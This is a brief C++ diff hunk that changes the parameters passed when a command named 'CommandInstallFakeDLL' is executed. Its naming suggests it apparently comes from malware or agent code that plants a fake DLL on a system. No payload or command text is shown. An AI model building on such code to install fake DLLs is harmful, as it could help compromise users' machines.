@@ -791,7 +791,7 @@ namespace FKI
 		{
 			#ifndef AGENTFULLTEST
 				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(),
-									 GetStr(EStrHistoryAnalizerCommandParams).t_str(), false);
+									 GetStr(EStrFakeDllInstallerCommandParams).t_str(), false);
 			#endif
         }
 
